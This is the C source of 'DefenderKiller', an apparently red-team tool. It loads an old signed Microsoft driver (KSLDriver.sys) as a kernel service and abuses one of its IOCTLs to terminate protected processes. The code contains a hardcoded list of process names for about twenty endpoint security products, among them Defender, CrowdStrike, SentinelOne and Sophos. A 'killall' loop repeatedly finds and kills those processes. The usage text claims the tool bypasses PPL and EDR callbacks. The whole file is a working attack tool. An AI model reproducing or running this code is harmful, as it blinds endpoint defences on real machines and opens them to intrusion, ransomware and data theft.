/*
 * DefenderKiller
 * Kernel process termination using Microsoft's own signed driver
 * KSLDriver.sys (2011) - ZwTerminateProcess from ring 0
 *
 * Author: Jehad Abudagga
 * X: @j3h4ck | GitHub: @redteamfortress
 */

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <winternl.h>
#include <tlhelp32.h>
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "ntdll.lib")

#define IOCTL    0x222044
#define SVC      "DefenderKiller"
#define DEV      L"\\\\.\\DefenderKiller"

static const char* EDR_PROCESSES[] = {
    /* Microsoft Defender */
    "MsMpEng.exe", "MsSense.exe", "SenseIR.exe", "SenseNdr.exe", "SenseCncProxy.exe",
    "SenseSampleUploader.exe", "MpCmdRun.exe", "NisSrv.exe", "SecurityHealthService.exe",
    /* CrowdStrike Falcon */
    "CSFalconService.exe", "CSFalconContainer.exe", "csagent.exe", "falconhost.exe",
    /* SentinelOne */
    "SentinelAgent.exe", "SentinelServiceHost.exe", "SentinelStaticEngine.exe",
    "SentinelStaticEngineScanner.exe", "SentinelHelperService.exe", "SentinelBrowserNativeHost.exe",
    /* Carbon Black (VMware) */
    "cb.exe", "RepMgr.exe", "RepUtils.exe", "RepUx.exe", "RepWAV.exe", "RepWSC.exe",
    "cbdaemon.exe", "CbDefense.exe", "CbDefenseService.exe",
    /* Cortex XDR (Palo Alto) */
    "CortexXDR.exe", "cyserver.exe", "CyvrFsFlt.exe", "CyProtectDrv.exe", "cytray.exe",
    "traps.exe", "trapsd.exe", "cyupdate.exe",
    /* Sophos */
    "SophosSafestore64.exe", "SophosFileScanner.exe", "SophosHealth.exe", "SophosCleanM64.exe",
    "SophosNtpService.exe", "hmpalert.exe", "SSPService.exe", "swi_service.exe",
    /* Elastic */
    "elastic-agent.exe", "elastic-endpoint.exe", "winlogbeat.exe", "filebeat.exe",
    /* Symantec / Broadcom */
    "ccSvcHst.exe", "Rtvscan.exe", "smcgui.exe", "smc.exe", "SymCorpUI.exe", "SepMasterService.exe",
    /* Trend Micro */
    "Ntrtscan.exe", "TmListen.exe", "TmWSCSvc.exe", "PccNTMon.exe", "TMBMSRV.exe", "CNTAoSMgr.exe",
    /* ESET */
    "ekrn.exe", "egui.exe", "ERAAgent.exe",
    /* Cylance */
    "CylanceSvc.exe", "CylanceUI.exe", "CylanceProtectSetup.exe",
    /* McAfee / Trellix */
    "mfetp.exe", "mcshield.exe", "mfemactl.exe", "masvc.exe", "mfemms.exe",
    /* Kaspersky */
    "avp.exe", "avpui.exe", "klnagent.exe",
    /* Bitdefender */
    "bdagent.exe", "bdservicehost.exe", "EPSecurityService.exe", "EPIntegrationService.exe",
    /* F-Secure / WithSecure */
    "fshoster32.exe", "FSMA32.exe", "fsgk32.exe",
    /* Malwarebytes */
    "MBAMService.exe", "mbamtray.exe",
    /* Fortinet FortiEDR */
    "FortiEDR.exe", "fortiedr.exe", "FortiESNAC.exe",
    /* Cybereason */
    "ActiveConsole.exe", "CybereasonSensor.exe", "CybereasonRansomFree.exe",
    /* Qualys */
    "QualysAgent.exe",
    NULL
};

typedef NTSTATUS(WINAPI* pNtQIP)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

BOOL GetNtPath(WCHAR* out)
{
    pNtQIP fn = (pNtQIP)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    if (!fn) return FALSE;
    ULONG n = 0;
    fn(GetCurrentProcess(), (PROCESSINFOCLASS)27, NULL, 0, &n);
    if (!n) return FALSE;
    BYTE* b = (BYTE*)calloc(n + 2, 1);
    if (fn(GetCurrentProcess(), (PROCESSINFOCLASS)27, b, n, NULL))
    {
        free(b); return FALSE;
    }
    UNICODE_STRING* us = (UNICODE_STRING*)b;
    wcsncpy(out, us->Buffer, us->Length / 2);
    out[us->Length / 2] = 0;
    free(b);
    return TRUE;
}

BOOL IsDriverLoaded(void)
{
    HANDLE h = CreateFileW(DEV, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return TRUE; }
    return FALSE;
}

int CmdLoad(const char* path)
{
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[-] Driver not found: %s\n", path); return 1;
    }

    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!scm) { printf("[-] Access denied. Run as administrator.\n"); return 1; }

    printf("[*] Cleaning up stale service...\n");
    SC_HANDLE old = OpenServiceA(scm, SVC, SERVICE_ALL_ACCESS);
    if (old) { SERVICE_STATUS ss; ControlService(old, SERVICE_CONTROL_STOP, &ss); DeleteService(old); CloseServiceHandle(old); Sleep(500); }

    printf("[*] Creating service '%s'...\n", SVC);
    SC_HANDLE svc = CreateServiceA(scm, SVC, SVC, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, path, 0, 0, 0, 0, 0);
    if (!svc) { printf("[-] CreateService failed: %lu\n", GetLastError()); CloseServiceHandle(scm); return 1; }

    printf("[*] Configuring registry...\n");
    char rp[256];
    sprintf(rp, "SYSTEM\\CurrentControlSet\\Services\\%s", SVC);
    HKEY hk;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rp, 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS)
    {
        WCHAR dn[] = L"DefenderKiller";
        RegSetValueExW(hk, L"DeviceName", 0, REG_SZ, (BYTE*)dn, sizeof(dn));
        WCHAR ip[512];
        swprintf(ip, 512, L"\\??\\%hs", path);
        RegSetValueExW(hk, L"ImagePath", 0, REG_SZ, (BYTE*)ip, (DWORD)(wcslen(ip) + 1) * 2);
        WCHAR np[512] = { 0 };
        if (GetNtPath(np))
        {
            RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ, (BYTE*)np, (DWORD)(wcslen(np) + 1) * 2);
            printf("[*] AllowedProcess: %S\n", np);
        }
        RegCloseKey(hk);
    }

    printf("[*] Starting driver...\n");
    if (!StartServiceA(svc, 0, NULL) && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING)
    {
        printf("[-] StartService failed: %lu\n", GetLastError()); DeleteService(svc); CloseServiceHandle(svc); CloseServiceHandle(scm); return 1;
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    printf("[*] Verifying device access...\n");
    HANDLE h = CreateFileW(DEV, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) { printf("[-] Device \\\\.\\%s not accessible\n", SVC); return 1; }
    CloseHandle(h);

    printf("[+] Driver loaded successfully\n");
    printf("[+] Service: %s\n", SVC);
    printf("[+] Device:  \\\\.\\%s\n", SVC);
    printf("[+] Driver:  %s\n", path);
    return 0;
}

BOOL KillByPid(DWORD pid, const char* name)
{
    if (!pid || pid == 4) return FALSE;

    HANDLE h = CreateFileW(DEV, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;

    BYTE cmd[8] = { 0 }, out[8] = { 0 };
    DWORD br = 0;
    *(DWORD*)cmd = 8;
    *(DWORD*)(cmd + 4) = pid;
    if (!DeviceIoControl(h, IOCTL, cmd, 8, out, 8, &br, NULL))
    {
        CloseHandle(h);
        return FALSE;
    }

    CloseHandle(h);
    Sleep(300);

    HANDLE hc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hc)
    {
        printf("[+] Killed %s (PID %u)\n", name ? name : "unknown", pid);
        return TRUE;
    }
    CloseHandle(hc);
    printf("[-] Failed to kill %s (PID %u)\n", name ? name : "unknown", pid);
    return FALSE;
}

int CmdKill(const char* target)
{
    DWORD pid = 0;
    char procName[260] = { 0 };

    if (target[0] >= '0' && target[0] <= '9')
    {
        pid = atoi(target);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe))
            do { if (pe.th32ProcessID == pid) { WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, procName, 260, NULL, NULL); break; } } while (Process32NextW(snap, &pe));
        CloseHandle(snap);
    }
    else
    {
        strncpy(procName, target, 259);
        WCHAR wTarget[260] = { 0 };
        MultiByteToWideChar(CP_ACP, 0, target, -1, wTarget, 260);
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
        if (Process32FirstW(snap, &pe))
            do { if (_wcsicmp(pe.szExeFile, wTarget) == 0) { pid = pe.th32ProcessID; break; } } while (Process32NextW(snap, &pe));
        CloseHandle(snap);
        if (!pid) { printf("[-] Process '%s' not found\n", target); return 1; }
    }

    if (!pid || pid == 4) { printf("[-] Cannot kill PID %u\n", pid); return 1; }

    printf("[*] Target: %s (PID %u)\n", procName[0] ? procName : "unknown", pid);

    if (!IsDriverLoaded())
    {
        printf("[-] Driver not loaded. Run 'load' first.\n");
        return 1;
    }

    if (KillByPid(pid, procName))
        return 0;

    printf("[-] PID %u still alive\n", pid);
    return 1;
}

static BOOL LoadCustomTargets(const char* filePath, char targets[][260], int* count, int maxTargets)
{
    FILE* f = fopen(filePath, "r");
    if (!f) return FALSE;

    char line[260];
    *count = 0;
    while (fgets(line, sizeof(line), f) && *count < maxTargets)
    {
        size_t len = strlen(line);
        while (len > 0 && (line[len - 1] == '\n' || line[len - 1] == '\r' || line[len - 1] == ' '))
            line[--len] = 0;
        if (len == 0 || line[0] == '#') continue;
        strncpy(targets[*count], line, 259);
        targets[*count][259] = 0;
        (*count)++;
    }
    fclose(f);
    return TRUE;
}

int CmdKillAll(int interval, const char* customListPath)
{
    if (!IsDriverLoaded())
    {
        printf("[-] Driver not loaded. Run 'load' first.\n");
        return 1;
    }

    char customTargets[512][260];
    int customCount = 0;

    if (customListPath)
    {
        if (!LoadCustomTargets(customListPath, customTargets, &customCount, 512))
        {
            printf("[-] Failed to read custom target list: %s\n", customListPath);
            return 1;
        }
        printf("[*] Loaded %d custom targets from %s\n", customCount, customListPath);
    }

    int builtinCount = 0;
    for (int i = 0; EDR_PROCESSES[i] != NULL; i++) builtinCount++;

    int totalTargets = builtinCount + customCount;
    printf("[*] EDR killer loop started (%d built-in + %d custom targets)\n", builtinCount, customCount);
    printf("[*] Scan interval: %d ms\n", interval);
    printf("[*] Press Ctrl+C to stop\n\n");

    int totalKilled = 0;
    int sweepNum = 0;

    while (TRUE)
    {
        sweepNum++;
        int killedThisSweep = 0;

        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap == INVALID_HANDLE_VALUE) { Sleep(interval); continue; }

        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);

        if (Process32FirstW(snap, &pe))
        {
            do
            {
                if (pe.th32ProcessID == 0 || pe.th32ProcessID == 4) continue;

                char nameA[260] = { 0 };
                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, nameA, 260, NULL, NULL);

                BOOL match = FALSE;
                for (int i = 0; EDR_PROCESSES[i] != NULL; i++)
                {
                    if (_stricmp(nameA, EDR_PROCESSES[i]) == 0) { match = TRUE; break; }
                }
                if (!match)
                {
                    for (int i = 0; i < customCount; i++)
                    {
                        if (_stricmp(nameA, customTargets[i]) == 0) { match = TRUE; break; }
                    }
                }

                if (match)
                {
                    if (KillByPid(pe.th32ProcessID, nameA))
                    {
                        killedThisSweep++;
                        totalKilled++;
                    }
                }
            } while (Process32NextW(snap, &pe));
        }
        CloseHandle(snap);

        if (killedThisSweep > 0)
            printf("[*] Sweep #%d: killed %d processes (total: %d)\n", sweepNum, killedThisSweep, totalKilled);

        Sleep(interval);
    }

    return 0;
}

int CmdUnload(void)
{
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scm) { printf("[-] Access denied\n"); return 1; }

    SC_HANDLE svc = OpenServiceA(scm, SVC, SERVICE_ALL_ACCESS);
    if (!svc)
    {
        printf("[*] Service '%s' not found (already clean)\n", SVC);
        CloseServiceHandle(scm);
        return 0;
    }

    SERVICE_STATUS ss;
    printf("[*] Stopping service...\n");
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    Sleep(300);

    printf("[*] Deleting service...\n");
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    printf("[+] Driver unloaded and service removed\n");
    return 0;
}

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        printf("\n");
        printf("  ██████╗ ███████╗███████╗███████╗███╗   ██╗██████╗ ███████╗██████╗ \n");
        printf("  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔══██╗██╔════╝██╔══██╗\n");
        printf("  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║██║  ██║█████╗  ██████╔╝\n");
        printf("  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗\n");
        printf("  ██████╔╝███████╗██║     ███████╗██║ ╚████║██████╔╝███████╗██║  ██║\n");
        printf("  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝\n");
        printf("  ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗                           \n");
        printf("  ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗                          \n");
        printf("  █████╔╝ ██║██║     ██║     █████╗  ██████╔╝                          \n");
        printf("  ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗                          \n");
        printf("  ██║  ██╗██║███████╗███████╗███████╗██║  ██║                          \n");
        printf("  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝                          \n");
        printf("\n");
        printf("  Jehad Abudagga\n");
        printf("  X: @j3h4ck | GitHub: @redteamfortress\n\n");
        printf("  Microsoft's own signed driver turned against itself.\n");
        printf("  KSLDriver.sys (2011) kernel ZwTerminateProcess.\n");
        printf("  Bypasses PPL, EDR callbacks, ObRegisterCallbacks.\n\n");
        printf("  Usage:\n");
        printf("    %s load <driver_path>\n", argv[0]);
        printf("    %s kill <PID | process_name>\n", argv[0]);
        printf("    %s killall [--interval <ms>] [--list <file>]\n", argv[0]);
        printf("    %s unload\n\n", argv[0]);
        printf("  killall options:\n");
        printf("    --interval <ms>   Sweep interval in milliseconds (default: 500)\n");
        printf("    --list <file>     Additional process names to target (one per line)\n\n");
        return 1;
    }

    if (_stricmp(argv[1], "load") == 0)
    {
        if (argc < 3) { printf("[-] Usage: %s load <path_to_KSLDriver_2011.sys>\n", argv[0]); return 1; }
        return CmdLoad(argv[2]);
    }

    if (_stricmp(argv[1], "kill") == 0)
    {
        if (argc < 3) { printf("[-] Usage: %s kill <PID | process_name>\n", argv[0]); return 1; }
        return CmdKill(argv[2]);
    }

    if (_stricmp(argv[1], "killall") == 0)
    {
        int interval = 500;
        const char* listPath = NULL;
        for (int i = 2; i < argc; i++)
        {
            if (_stricmp(argv[i], "--interval") == 0 && i + 1 < argc)
                interval = atoi(argv[++i]);
            else if (_stricmp(argv[i], "--list") == 0 && i + 1 < argc)
                listPath = argv[++i];
        }
        if (interval < 100) interval = 100;
        return CmdKillAll(interval, listPath);
    }

    if (_stricmp(argv[1], "unload") == 0)
        return CmdUnload();

    printf("[-] Unknown command: %s\n", argv[1]);
    return 1;
}